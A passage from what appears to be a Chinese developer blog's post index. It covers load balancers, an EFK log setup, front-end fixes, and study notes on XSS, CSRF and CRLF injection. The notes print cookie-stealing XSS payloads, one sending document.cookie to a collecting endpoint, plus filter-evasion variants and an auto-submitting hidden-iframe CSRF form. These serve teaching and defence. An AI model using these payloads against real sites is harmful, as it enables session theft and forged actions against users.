流量的高级负载均衡，面向交付包括微服务和基于容器的应用程序在内的现代应用程序架构，提供高级请求路由功能。Application Load Balancer 通过确保始终使用最新的 SSL/TLS 密码和协议，简化并提高应用程序的安全性。 ABL于2016年8月发布，与现有的负载均衡器（OSI第4层TCP/UDP均衡器）不同，ALB将查看数据包并将其发送到正确的服务。单个ALB可以为许多后端服务平衡流量，而不是为每个服务运行弹性负载均衡器。例如，包含的URL /api可以路由到与包含的URL /signup不同的后端服务。 NLBNetwork Load Balancer 网络负载均衡器运行于连接级别（第 4 层），可根据 IP 协议数据将连接路由至 Amazon Virtual Private Cloud (Amazon VPC) 内的不同目标（Amazon EC2 实例、微服务和容器）。网络负载均衡器最适合 TCP 流量的负载均衡，能够在保持超低延迟的同时每秒处理数百万个请求。网络负载均衡器还经过了优化，能够处理突发的和不稳定的流量模式，同时在每个可用区使用单个静态 IP 地址。它与其他流行的 AWS 服务集成，例如 Auto Scaling、Amazon EC2 Container Service (ECS)、Amazon CloudFormation 和 Amazon AWS Certificate Manager (ACM)。 CLBClassic Load Balancer 同时运行于请求级别和连接级别，可在多个 Amazon EC2 实例之间提供基本的负载均衡。Classic Load Balancer 适用于在 EC2-Classic 网络内构建的应用程序。在使用 Virtual Private Cloud (VPC) 时，我们建议使用第 7 层 Application Load Balancer 和第 4 层网络负载均衡器。 使用 CLB 而不是 ALB 具有以下优势： 支持 EC2-Classic 支持 TCP 和 SSL 侦听器 支持使用应用程序生成的 cookie 的粘性会话 CLB速度慢于ALB。 参考文档 Elastic Load Balancing 功能 负载均衡 - 文档中心 - 腾讯云 AWS Launches Application Load Balancer 封面来源: pixabay, free for commercial use.","link":"/2019/load-balancing/"},{"title":"纯本地搭建 EFK 管理远程服务器日志","text":"项目staging环境日志难以搜索，计划搭建EFK管理日志，但是EFK内存消耗太大，再新增云服务器不划算，打算搭建在本地（16G内存）。 什么是 EFKEFK不是一个软件，而是一套解决方案，并且都是开源软件，其中 ELasticsearch 负责日志保存和搜索，FileBeat 负责收集日志，Kibana 负责界面。 ElasticsearchElasticsearch是个开源分布式搜索引擎，提供搜集、分析、存储数据三大功能。它的特点有：分布式，零配置，自动发现，索引自动分片，索引副本机制，restful风格接口，多数据源，自动搜索负载等。 FileBeatFilebeat 隶属于 Beats，搜集日志数据并上载到 Elasticsearch、Logstash、Redis 等平台。 KibanaKibana 提供日志分析的友好 Web 界面，可以帮助汇总、分析和搜索重要数据日志。 环境现状 本地环境：Windows 10，Intel(R) Core(TM) i5-7500 CPU，内存 16G 远程环境：SUSE Linux Enterprise Server 11，可用内存不足 1G 本地可以启虚拟机，但没钱买额外的云服务器。 最初想法目前有3种思路： 本地启动Elasticsearch、Kibana、Filebeat，服务器启动FTP，并映射到本地网络驱动器，Filebeat配置从网络驱动器读取log。 本地启动Elasticsearch、Kibana，用反向代理工具FRP暴露Elasticsearch的9200端口到公网（注意配置鉴权），远程启动Filebeat，输出到本地的Elasticsearch。 本地启动Elasticsearch、Kibana，Logstash，远程启动Filebeat、Redis，远程的Filebeat输出到Redis，本地的Logstash从Redis上读取，转发给Elasticsearch。 方案确定以上的三种方案都存在阻力： 不能稳定映射，经常断开，且I/O速度太慢 反向代理工具不能在公司中使用 配置较复杂 睡一觉之后产生了第4种方案：4. 本地启动Elasticsearch、Kibana、Filebeat，循环执行rsync命令，SSH连接到服务器并把log增量同步到本地，本地Filebeat就可以畅快地读取了 动手搭建Elasticsearch、Kibana由于资源消耗大，决定在Windows环境下启动rsync 由于是 Linux 下的，只能在虚拟 Ubuntu 下启动Filebeat 由于 log 在 Ubuntu 下，为了I/O效率，也在 Ubuntu 下启动 启动 E &amp; K安装 Kibanahttps://www.elastic.co/guide/en/kibana/current/windows.html 安装 Elasticsearchhttps://www.elastic.co/guide/en/elasticsearch/reference/current/getting-started-install.html 请参考官方安装文档进行安装，本教程所用配置如下： elasticsearch.yml12network.host: [_local_, _site_]http.port: 9200 kibana.yml123server.port: 5601server.host: &quot;0.0.0.0&quot;elasticsearch.url: &quot;http://localhost:9200&quot; 启动虚拟机这里使用Vagrant启动，安装Virtualbox和Vagrant，创建Vagrantfile如下 Vagrantfile123456Vagrant.configure(&quot;2&quot;) do |config| config.vm.box = &quot;ubuntu/xenial64&quot; config.vm.provider &quot;virtualbox&quot; do |vb| vb.memory = &quot;8192&quot; endend 同目录下执行 vagrant up，然后 vagrant ssh 连接上虚拟机。 启动 Filebeat安装Filebeat12curl -L -O https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-6.3.2-amd64.debsudo dpkg -i filebeat-6.3.2-amd64.deb 配置Filebeat1sudo vim /etc/filebeat/filebeat.yml 这是common的配置，请按照自己项目的log格式配置相应的插件。10.0.2.2 代表宿主机，如果你用的也是Virtualbox + Vagrant，不要改动。 filebeat.yml1234567891011121314151617filebeat.inputs:- type: log enabled: true paths: - /home/vagrant/logs/*filebeat.config.modules: path: ${path.config}/modules.d/*.yml reload.enabled: falsesetup.template.settings: index.number_of_shards: 3setup.kibana: host: &quot;10.0.2.2:5601&quot;setup.template.name: &quot;filebeat&quot;setup.template.pattern: &quot;filebeat-*&quot;output.elasticsearch: hosts: [&quot;10.0.2.2:9200&quot;] index: &quot;filebeat-%{+yyyy.MM.dd}&quot; 确保前面已经启动Elasticsearch和Kibana，然后启动Filebeat，sudo service filebeat start 从server端增量同步log首先服务器必须开启ssh_key登录，在Ubuntu下生成ssh配置到服务器的 authorized_keys 中。 执行 byobu，这会开一个终端 session，在此执行的命令不会因为终端退出而终止。 快捷键 作用 F2 新建一个窗口 F3 切换到上一个窗口 F4 切换到上一个窗口 F7 浏览当前窗口的历史打印信息 F6 让 byobu 到后台去 Ctrl + F6 关闭当前窗口 修改以下命令，并执行实现增量同步： 1while true;do rsync -rtv --include &quot;**.log&quot; --exclude &quot;*.*&quot; --append -e &quot;ssh -p &lt;服务器SSH端口号&gt;&quot; &lt;服务器登录用户名&gt;@&lt;服务器地址&gt;:/var/logs /home/vagrant;sleep 5;done; 这个命令很长，所以给出命令解释： while true 循环执行 -rtv r代表递归目录，t代表保留待同步文件的修改时间，v代表啰嗦模式，输出更多同步信息（可以-vv更啰嗦模式） --include &quot;**.log&quot; --exclude &quot;*.*&quot; 只同步log文件 --append 增量同步，会比较文件大小，只同步多出来的部分 -e &quot;ssh -p &lt;服务器SSH端口号&gt;&quot; 自定义SSH程序命令行，自定义端口 /var/logs /home/vagrant 同步服务器的 /var/logs 目录到本地的 /home/vagrant 下 sleep 5 同步每次结束后休息5秒，避免过多占用服务器带宽 有兴趣的童鞋可以到这里学习rsync命令的更多用法：https://www.cnblogs.com/f-ck-need-u/p/7221713.html 撒花按F6把循环进程切到后台，稍等片刻后访问 http://localhost:5601/，看看能否查询到 log 了 如果历史log量很大，首次启动后会处理大量的log，短时间内查出大量的log是正常现象。","link":"/2019/local-efk-analyze-remote-log/"},{"title":"Make simple &lt;md-chip&gt; work without &lt;md-chips&gt; in AngularJS Material?","text":"I’m using AngularJS Material v1.1.1.I’m finding a way to use simple &lt;md-chip&gt; without &lt;md-chips&gt;. Here is an easy way in Vue Material: https://codesandbox.io/s/lyoqv4l0z?module=App.vue 1&lt;md-chip class=&quot;md-primary&quot; md-deletable&gt;Deletable&lt;/md-chip&gt; But I can not find the similiar way in AngularJS Material document.https://material.angularjs.org/latest/api/directive/mdChip Here is my code:https://codepen.io/iMaeGoo/pen/EJaaqp 1234567891011121314&lt;body ng-app=&quot;myApp&quot; ng-controller=&quot;AppCtrl&quot;&gt; &lt;p&gt; &lt;md-chips ng-model=&quot;chips&quot;&gt; &lt;md-chip-template&gt; {{ $chip }} &lt;/md-chip-template&gt; &lt;/md-chips&gt; &lt;/p&gt; &lt;p&gt; &lt;!-- I want to make this simple md-chip work here --&gt; &lt;md-chip&gt;{{oneChip}}&lt;/md-chip&gt; &lt;/p&gt;&lt;/body&gt; 1234angular.module('myApp',['ngMaterial']).controller('AppCtrl', function($scope) { $scope.chips = [&quot;A chip in chips!&quot;]; $scope.oneChip = &quot;A chip without chips!&quot;;}); One workaround is to rewrite CSS. 1234567891011121314151617md-chips { md-chips-wrap { border: none; padding: 0; box-shadow: none; cursor: inherit; width: fit-content; ._md-chip-input-container { display: none; } } md-chip { margin: 0; }} 123&lt;md-chips class=&quot;chips&quot; ng-model=&quot;chips&quot; md-max-chips=&quot;1&quot;&gt; &lt;md-chip-template&gt;{{ $chip }}&lt;/md-chip-template&gt;&lt;/md-chips&gt; 123angular.module('myApp', ['ngMaterial']).controller('AppCtrl', function($scope) { $scope.chips = [&quot;One chip&quot;];}); See: https://codepen.io/iMaeGoo/pen/BEyKem The chip is still in chips component. It is not a good idea. Feel free to answer if you have better idea!https://stackoverflow.com/questions/55455225/how-to-make-simple-md-chip-work-without-md-chips-in-angularjs-material","link":"/2019/md-chip-without-md-chips/"},{"title":"AngularJS Material制作气泡弹出效果","text":"点击一个按钮后需要弹出一个对话气泡，气泡内有各种设置项，点击外侧可以退出。 现在的效果： 在线测试：https://codepen.io/iMaeGoo/pen/KYVRGL 开始的设计图： 实际应用： 使用AngularJS Material v1.1.1版本，基于md-menu实现，就不难了，还赠送动画效果。 但是md-menu弹出来的只能是一个方形区域，怎么画出来气泡柄呢？ 我们知道盒模型中，border在角落处是斜向延伸的，即：四个方向的每个border都是个梯形，当内容宽度、高度都设为0时，就成了下图的样子，阴影区域其实是border-bottom： 123456.right-triangle { width: 0; height: 0; border: solid 20px transparent; border-bottom-color: grey;} 好了，基于这个特性，画出了直角三角形，但是需要对阴影和menu整体设置一个阴影，否则仍不完美。 代码： CSS123456789101112131415161718.md-open-menu-container { box-shadow: 0 1px 8px 0 rgba(0, 0, 0, 0.2);}.bubble-content { width: 300px; height: 200px;}.md-open button:after { content: ''; position: absolute; border: solid 8px transparent; border-bottom-color: white; left: 50px; top: 20px; pointer-events: none;} JS1234567angular .module('menuDemoBasic', ['ngMaterial']) .controller('BasicDemoCtrl', function DemoCtrl($mdDialog) { this.openMenu = function($mdOpenMenu, ev) { $mdOpenMenu(ev); }; }); HTML1234567891011121314&lt;div class=&quot;md-menu-demo&quot; ng-app=&quot;menuDemoBasic&quot; ng-controller=&quot;BasicDemoCtrl as ctrl&quot;&gt; &lt;div class=&quot;menu-demo-container&quot; layout-align=&quot;center center&quot; layout=&quot;column&quot;&gt; &lt;md-menu md-position-mode=&quot;target-left bottom&quot;&gt; &lt;md-button class=&quot;md-raised md-primary md-button md-ink-ripple&quot; ng-click=&quot;ctrl.openMenu($mdOpenMenu, $event)&quot;&gt; show bubble &lt;/md-button&gt; &lt;md-menu-content&gt; &lt;div class=&quot;bubble-content&quot; layout-align=&quot;center center&quot; layout=&quot;column&quot;&gt; &lt;p&gt;Something in the bubble&lt;/p&gt; &lt;/div&gt; &lt;/md-menu-content&gt; &lt;/md-menu&gt; &lt;/div&gt;&lt;/div&gt; 下一步准备研究一下阴影的问题，欢迎提意见。","link":"/2019/md-bubble/"},{"title":"小米 MIUI 10 锁屏画报原图批量提取","text":"需要 ROOT 权限 用 ES、MT、RE 等类型的文件管理器复制以下目录到内部存储/data/data/com.mfashiongallery.emag/files/img_cache/ 将复制出来的文件批量重命名，添加 jpg 后缀","link":"/2019/miui-fashion-gallery/"},{"title":"MySQL 查询有哪些表关联了指定表","text":"1select * from INFORMATION_SCHEMA.KEY_COLUMN_USAGE where REFERENCED_TABLE_NAME='[表名]'","link":"/2019/mysql-referenced-table/"},{"title":"粘性布局之粘底效果（position sticky, bottom 0）","text":"经常在查资料时访问各种 CSDN 博客会发现，当 屏幕高度 &lt; 左边栏的高度 &lt; 内容的高度 时，滚动屏幕，左边栏会随着内容一同滚动，当滚动到左边栏底部时，左边栏会停止滚动，而内容会继续滚动。 这种设计的优势在于，用户既能够滚动左边栏，又不会在左边栏不够长时，造成页面左侧大片空白的尴尬，这种布局模式，叫做 粘性布局（sticky）。 粘性布局在元素满足显示条件时，表现与普通布局没什么不同，但当元素随着页面滚动而无法显示时，会转为 fixed 布局效果，主流浏览器已经全部支持粘性布局（IE不支持）。 通俗一点讲，类似于 Excel 中的“冻结窗格”。 绝大多数网上的教程材料都用 position: sticky; top: 0; 这样的组合来举例，但为了实现 CSDN 左边栏效果，position: sticky; bottom: 0; 似乎不能和想象一样的起作用。 先说结论吧 sticky 的确是无法直接粘底的…… CSDN 使用 JS 动态计算实现，当计算到左边栏底部即将滚上屏幕时，立即对左边栏添加 position: fixed; bottom: 0; 样式，把左边栏定死，延时较为明显，快速上下滚动时能看到闪烁。 我使用 position: sticky; 实现，通过 JS 计算 屏幕高度 - 左边栏高度 得到 top 的值，快速滚动时没有闪烁。 发现的过程 发现 position: sticky; bottom: 0; 不起作用后，上网搜索也并未查到结果。 F12 研究 CSDN 的实现方式，发现其依赖于滚动事件，如此实现避免不了延迟和过度计算的问题，决定再找方法。 既然 bottom 起不了效果，就尝试设置 top 为负值，果然能够控制元素向上移动， 但 top 的取值依赖于左边栏自身的高度，CSS 怎么拿到自身的高度呢？ 想到 calc，就写出了 top: calc(100vh - height) 这样的句子…… 不管用。 摸索了半天 calc 的用法，发现确实是用不成了，calc 拿不到元素自身高度，只能写 JS 了。 最终通过 JS 完成了这样的需求。 123456789101112131415161718192021// 仿 CSDN 左侧栏吸底效果，设置 position 为 sticky，top 为屏幕高度减去左侧栏高度，比 CSDN 的实现更简洁。var columnLeft = $('.column-left')[0];function fixLeftColumnTop() { // 小屏忽略，因为小屏没有左边栏 if ($(window).width() &lt; 769) { columnLeft.style.top = null; } else { if (columnLeft) { // 屏幕高度 - 左边栏高度 - 左边栏距离底部的保留距离 columnLeft.style.top = $(window).height() - columnLeft.scrollHeight - 10 + 'px'; } else { // 左边栏还没加载出来，等 500 毫秒再找 setTimeout(function () { columnLeft = $('.column-left')[0]; fixLeftColumnTop(); }, 500); } }}fixLeftColumnTop();$(window).resize(fixLeftColumnTop); 如果你也想用这段代码，别忘了把 .column-left 替换成你的粘性元素的选择器，并在那个元素上添加 position: sticky; 样式~ 另外一个小发现Windows 环境，缩放 100% 下，当 top 的值为非整数像素值时，Chrome 会有元素内字体模糊的情况，Firefox 和 Edge 没有问题，所以有必要对 top 取整确保字体清晰。","link":"/2019/position-sticky-bottom/"},{"title":"让 MySQL Workbench 直接显示 BLOB 字段的内容","text":"使用MySQL Workbench，查询一个带BLOB字段的表时： 1SELECT * FROM mysql.general_log ORDER BY event_time; 只能看到一个BLOB图标。 直接做法右键BLOB字段，Open Value in Viewer（hmmmm，谁都知道啊，但是好笨啊！不能一次看完吗？） SQL CONVERT 做法在查询中使用CONVERT函数处理BLOB字段 1SELECT *, CONVERT(argument USING utf8) FROM mysql.general_log ORDER BY event_time; 这样就很清晰啦（图有误）： 作为非二进制字符串处理 BINARY / VARBINARY Go to Edit &gt; Preferences Choose SQL Queries Under Query Results, check Treat BINARY/VARBINARY as nonbinary character string It’s not mandatory to restart MySQL Workbench (you will not be prompted or informed of this requirement).* 这个方法来自Stack Overflow，我没有成功验证这个方法，设置之后无效，有点奇怪。","link":"/2019/mysql-workbench-show-blob/"},{"title":"van-list 一直触发加载问题的排查","text":"移动端分页一般都是向下滑动加载更多，Vant 组件库提供了 van-list 来实现这一功能。 List 组件通过loading和finished两个变量控制加载状态，当组件滚动到底部时，会触发load事件并将loading设置成true。此时可以发起异步操作并更新数据，数据更新完毕后，将loading设置成false即可。若数据已全部加载完毕，则直接将finished设置成true即可。 实际应用中发现，即使内部元素已经填满一整屏，仍然会触发加载，直到我模拟的20多页全部加载完才停下来。 我没有给这个问题写专门的 CodePen demo，比较麻烦，碰到的人也不一定多。 结论van-list 会在内容之后增加一个 placeholder，通过 placeholder 的位置判断内容是否已填充满屏。van-list 本身为 flex 布局时，flex-direction 必须是 column（或 column-reverse）。 过程首先我的用法是这样的： template1234567&lt;van-list&gt; &lt;!-- flex --&gt; &lt;van-grid&gt; &lt;van-grid-item /&gt; &lt;van-grid-item /&gt; &lt;van-grid-item /&gt; &lt;/van-grid&gt;&lt;/van-list&gt; 首先看文档，英文文档没有提到，但中文文档有以下一段话： 使用 float 布局后一直触发加载？若 List 的内容使用了 float 布局，可以在容器上添加van-clearfix类名来清除浮动，使得 List 能正确判断元素位置 检查了一下，我没有在使用 float 布局呀。 那看一下Vant源码，主要看Vant是如何判断页面何时去加载的： check()1234567891011121314151617181920212223242526272829303132333435363738this.$nextTick(() =&gt; { if (this.loading || this.finished || this.error) { return; } const { $el: el, scroller, offset, direction } = this; let scrollerRect; if (scroller.getBoundingClientRect) { scrollerRect = scroller.getBoundingClientRect(); } else { scrollerRect = { top: 0, bottom: scroller.innerHeight }; } const scrollerHeight = scrollerRect.bottom - scrollerRect.top; /* istanbul ignore next */ if (!scrollerHeight || isHidden(el)) { return false; } let isReachEdge = false; const placeholderRect = this.$refs.placeholder.getBoundingClientRect(); if (direction === 'up') { isReachEdge = placeholderRect.top - scrollerRect.top &lt;= offset; } else { isReachEdge = placeholderRect.bottom - scrollerRect.bottom &lt;= offset; } if (isReachEdge) { this.$emit('input', true); this.$emit('load'); }}); scrollerRect 是滚动区域的位置，通过 debug 看到获取到的值没有问题，但 placeholderRect 的值一直都是同一个值，导致 isReachEdge 一直是 true。 进一步 inspect 页面元素，发现这个 placeholder 的位置在这里： template12345678&lt;van-list&gt; &lt;van-grid&gt; &lt;van-grid-item /&gt; &lt;van-grid-item /&gt; &lt;van-grid-item /&gt; &lt;/van-grid&gt; &lt;div class=&quot;van-list__placeholder&quot;&gt;&lt;/div&gt; &lt;!-- placeholder --&gt;&lt;/van-list&gt; placeholder 是一个没有大小的 div，由于 van-list 是 flex 横向布局，placeholder 自然地落在了 van-grid 的右边，这时不管 van-grid 怎么高，placeholder 的位置都不变了。 知道了问题所在，我们在 van-list 元素上增加了 flex-direction: column; 成功地解决了问题。","link":"/2019/van-list-always-load/"},{"title":"Vagrant 修改 box 保存位置 &amp; 虚拟机位置到非系统盘","text":"修改 box 保存位置在环境变量中添加： 修改虚拟机保存位置打开VirtualBox，选择File-&gt;Preferences，修改Default Machine Folder：","link":"/2019/vagrant-path/"},{"title":"VS Code 写 C# 怎样自动导包（Auto-using）","text":"在 Visual Studio 中可以使用 Alt + Shift + F10 来自动导包，在 VS Code 中怎么操作呢？ 快捷键是 Ctrl + .（句点）。 坑：必须在英文状态下按快捷键才能起作用。 如果你还没有安装安装并配置 VS Code 的 csharp 插件，这个快捷键可能不起作用。 在 Extensions 页搜索安装 C# 重新打开项目，会弹出提示，选择是 等待 Output 输出 Finished 来源：https://stackoverflow.com/questions/148977/visual-studio-keyboard-shortcut-to-automatically-add-the-needed-using-statemenhttps://docs.microsoft.com/en-us/dotnet/core/tutorials/with-visual-studio-code","link":"/2019/vscode-csharp-auto-using/"},{"title":"直接操作 Vue data 中不存在的属性导致的 v-model 绑定异常问题","text":"初学Vue遇到的问题，尝试了几个小时才搞明白，大佬应该一眼就能看出什么问题吧…… 需要注意，不要直接在JS中操作一个Vue data对象中不存在的属性，如果同时有通过v-model绑定到该对象的不存在的属性时，会出现诡异的行为表现，console中不会报出任何 warn 或 error。 需求是，实现三个复选框，第一个复选框初始为选中状态，一开始写出来是这样的—— HTML12345&lt;div id=&quot;app&quot; style=&quot;margin: 10px;&quot;&gt; &lt;van-checkbox v-for=&quot;box in checkboxes&quot; :key=&quot;box.id&quot; v-model=&quot;box.selected&quot;&gt; 复选框 {{ box.title }} &lt;/van-checkbox&gt;&lt;/div&gt; JS123456789101112131415new Vue({ el: '#app', data () { return { checkboxes: [ { id: 1, title: 'a' }, { id: 2, title: 'b' }, { id: 3, title: 'c' } ] } }, created () { this.checkboxes[0].selected = true }}) 试下效果： See the Pen vue-v-model-not-work by iMaeGoo (@iMaeGoo) on CodePen. 复选框a的表现显然是异常的，点击不能成功地切换选中状态，而在点击之后再点击其他复选框，才会“有延迟地”切换状态。 为什么会这样？尝试在created方法的末尾打印出this.checkboxes[0]—— 发现 id 和 title 都变成了 getter/setter 的形式，而 selected 仍然是独立的属性。 后续查询发现，Vue 官方文档 - 深入响应式原理 的第一段话是—— 当你把一个普通的 JavaScript 对象传入 Vue 实例作为 data 选项，Vue 将遍历此对象所有的属性，并使用 Object.defineProperty 把这些属性全部转为 getter/setter。Object.defineProperty 是 ES5 中一个无法 shim 的特性，这也就是 Vue 不支持 IE8 以及更低版本浏览器的原因。 在 created 方法中，我尝试直接对 Vue data 对象中的属性操作，而 v-model 需要使用 getter/setter 操作，二者即产生了冲突。 解决方式 1在 data 中添加 selected 属性，即使初值为undefined或者null，也能够让 Vue 正确识别所有对象属性。 JS123456789data () { return { checkboxes: [ { id: 1, title: 'a', selected: undefined }, { id: 2, title: 'b', selected: undefined }, { id: 3, title: 'c', selected: undefined } ] }} 解决方式 2在JS中操作原本不存在的属性时，使用 Vue.set(object, propertyName, value) 方法向嵌套对象添加响应式属性 JS1234created () { // Vue.set 等同 this.$set this.$set(this.checkboxes[0], 'selected', true)}","link":"/2019/vue-model-not-work/"},{"title":"XSS, CSRF, CRLF, SQL注入学习笔记","text":"XSS, CSRF, CRLF, SQL注入都是历史悠久的四种攻击方式，因为参数化查询已经成了普遍用法，我们已经离SQL注入很远了，但是，XSS，CSRF，CRLF却没有远离我们。 本文以初学者角度探讨四种Web攻击以及预防方式，是个人基于对多种Web漏洞的学习总结，不承诺内容规范。 XSS 跨站脚本跨站脚本（XSS，Cross Site Scripting）攻击是一种注入攻击，其恶意脚本被注入到其他可信网站中。当攻击者使用Web应用将恶意代码（通常以浏览器脚本的形式）发送给不同的最终用户时，就会发生XSS攻击。 允许这些攻击成功的缺陷非常普遍，并且发生在Web应用程序在其生成的输出中使用来自用户的输入而无需验证或编码它的任何地方。 攻击者可以使用XSS将恶意脚本发送给毫无戒心的用户。最终用户的浏览器无法知道该脚本不应该被信任，并将执行该脚本。 因为它认为脚本来自可靠来源，所以恶意脚本可以访问任何cookies，session tokens或浏览器保留并与该站点一起使用的其他敏感信息（比如document.cookie）。这些脚本甚至可以重写HTML页面的内容（比如document.body.innerHTML=&quot;&quot;）。 XSS攻击通常可以分为两类：存储和反射。还有第三种不太知名的XSS攻击类型，称为基于DOM的XSS。 存储XSS又名AKA Persistent，Type I 存储XSS通常在用户输入存储在目标服务器上时发生，例如在数据库，文件，论坛消息，访问日志等中，导致永久性的每次存储数据反射回响应文代码就会在浏览器中执行的一种XSS漏洞。 反射XSS又名AKA Non-Persistent，Type II 当Web应用程序在错误消息，搜索结果或包含用户作为请求的一部分提供的部分或全部输入的任何其他响应中立即返回用户输入，导致代码在浏览器执行时，会发生反射的XSS。 基于DOM的XSS又名AKA Type-0Amit Klein，发表了关于这个问题的第一篇文章，基于DOM的XSS是XSS的一种形式，其中从源到接收的整个受污染的数据流在浏览器中发生，即数据的来源是在DOM中，接收器也在DOM中，数据流永远不会离开浏览器。例如，源（读取恶意数据）可以是页面的URL（例如，document.location.href），或者它可以是HTML的元素，而接收器是一个敏感的方法调用，导致执行恶意数据（例如document.write）。 设想，某博客留言板允许插入第三方图片，输入图片URL后，会生成img标签： 1&lt;img src=&quot;图片地址&quot; /&gt; 普通图片地址：https://img.com/img.png XSS地址：https://img.com/img.png&quot; onload=&quot;javascript:alert(document.cookie); 文档呈现： 1&lt;img src=&quot;https://img.com/img.png&quot; onload=&quot;javascript:alert(document.cookie);&quot; /&gt; 扩展： 多年来，大多数人认为这些（存储，反射，DOM）是三种不同类型的XSS，但实际上它们是重叠的。你可以同时拥有存储和反射的基于DOM的XSS。你也可以使用存储和反映的非基于DOM的XSS。所以为了帮助澄清，从2012年中开始，研究团体提出并开始使用新术语来帮助组织可能发生的XSS类型： 服务器存储XSS 客户端存储XSS 服务器反射XSS 客户端反射XSS 此处不讲解，参考：https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting 实践在实际项目中实施XSS攻击，获取用户cookie信息。搭建Spring Boot Web项目，配置第三方服务以接收用户cookie信息。 12&lt;img src='x' onerror='alert(document.cookie)'&gt;&lt;img src='x' onerror='$.ajax({url:&quot;http://localhost:8084/xss?s=&quot;+document.cookie})'&gt; 备用XSS语法XSS在属性中使用脚本可以在不使用&lt;script&gt;标记的情况下进行XSS攻击。其他标签将完全相同，例如： 123&lt;body onload=alert(document.cookie)&gt;&lt;b onmouseover=alert(document.cookie)&gt;click me!&lt;/b&gt;&lt;img src=&quot;http://url.to.file.which/not.exist&quot; onerror=alert(document.cookie)&gt; XSS使用脚本通过编码的URI方案如果我们需要隐藏Web应用程序过滤器，我们可能会尝试对字符串字符进行编码，例如：a=&amp;#X41 (UTF-8)并在IMG标记中使用它： 1&lt;IMG SRC=j&amp;#X41vascript:alert(document.cookie)&gt; 有许多不同的UTF-8编码符号为我们提供了更多的可能性。 XSS使用代码编码我们可以在base64中对脚本进行编码并将其放在META标记中。这样我们完全摆脱了alert()。 1&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg&quot;&gt; 这些和其他示例可以在XSS Filter Evasion Cheat Sheet中找到，它是备用XSS语法攻击的真正百科全书。 预防 对用户输入进行转义（&lt;转义&amp;lt;，&gt;转义&amp;gt;，&quot;转义&amp;quot;，空格转义&amp;nbsp;） AngularJS 谨慎使用 ng-bind-html，$sce.trustAsHtml() CK editor 谨慎使用 ck.config.allowedContent（HTML内容过滤，建议在设置之前阅读安全性最佳实践） 对必须允许的HTML输入设置白名单过滤（GitHub的做法，Jsoup类库也可以很方便地实现，参考Sanitize untrusted HTML） 添加必要的 HTTP 响应头进行 XSS 防护 HTTP响应头 描述 X-XSS-Protection: 1; mode=block 该响应头会开启浏览器的防 XSS 过滤器 X-Frame-Options: deny 该响应头会禁止页面被加载到框架 X-Content-Type-Options: nosniff 该响应头会禁用客户端的 MIME 类型嗅探行为，参考这里 Content-Security-Policy: default-src ‘self’ 该响应头是防止 XSS 最有效的解决方案之一。它允许我们定义从 URLs 或内容中加载和执行对象的策略，参考这里 Set-Cookie: key=value; HttpOnly Set-Cookie 响应头通过 HttpOnly 标签的设置将限制 JavaScript 访问你的 Cookie Content-Type: type/subtype;charset=utf-8 始终设置响应的内容类型和字符集 CSRF 跨站请求伪造CSRF攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的。 GET场景通常使用以下技术之一完成： 发送带有HTML内容的电子邮件 网页上植入网址或脚本 漏洞利用网址可以伪装成普通链接，鼓励受害者点击它： 1&lt;a href=&quot;/rest/users/delete-all&quot;&gt;click here&lt;/a&gt; 或者作为0x0假图像： 1&lt;img width=&quot;0&quot; height=&quot;0&quot; src='/rest/users/delete-all'&gt; POST场景GET和POST攻击之间的唯一区别是受害者如何执行攻击。此类请求无法使用标准a或img标记进行传递，但可以使用form进行传递： 1234&lt;form action=&quot;/rest/users/delete-all&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;clientId&quot; value=&quot;123456&quot;/&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;/&gt;&lt;/form&gt; 此表单将要求用户单击提交按钮，但这也可以使用JavaScript自动执行： 首先在另一个网站上传以下代码： main.html123456789&lt;html lang=&quot;en-US&quot;&gt;&lt;head&gt; &lt;title&gt;Main&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;正常内容&lt;/p&gt; &lt;iframe id=&quot;iframe1&quot; style=&quot;display:none;&quot; src=&quot;frame.html&quot;&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt; frame.html1234567891011121314&lt;html lang=&quot;en-US&quot;&gt;&lt;head&gt; &lt;title&gt;CSRF frame&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form name=&quot;form1&quot; action=&quot;/rest/users/delete-all&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;clientId&quot; value=&quot;123456&quot;/&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;/&gt; &lt;/form&gt; &lt;script&gt; document.forms.form1.submit(); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 当被攻击用户去访问main.html时，他浑然不知浏览器悄悄地给另一个网站发送了修改设置的请求，显然浏览器在发送请求时自觉地还带上了被攻击网站的cookie。 如果把代码中的action换成微博的API，我们就能实现：如果你的浏览器已登录了微博，那你访问这篇文章的同时，就自动关注了我的微博。 究其原因： form可以跨域post数据。 Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。 学到这里我突然想到一个问题，JS可以读取页面iframe元素的内容，那我是否可以实现CSRF的同时读取到服务端返回值了呢？这样岂不是可以造成数据泄露？ 1234setTimeout(function() { var contentWindow = document.getElementById(&quot;iframe1&quot;).contentWindow; console.log(contentWindow.document);}, 1000); 开发浏览器的人早就想到了这个问题，只要是跨域的iframe读取与操作，都是不允许的。Uncaught DOMException: Blocked a frame with origin &quot;null&quot; from accessing a cross-origin frame. 组合XSS实现XSRF直接把上面代码利用XSS漏洞，嵌入被攻击站点，这组合攻击方式称为XSRF。 预防CSRF攻击的一般是由服务端解决。 遵循RESTful规范，避免在GET请求中作数据修改操作 添加特殊请求参数做验证 验证码 Referer Check Anti CSRF Token 如果网站同时存在XSS漏洞，依然可以通过JS获取到Token。 CRLF 返回头拆分参数注入返回头CRLF是”回车换行”（\\r\\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF区分HTTP头和HTTP体。 所以，一旦我们能够控制HTTP头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。 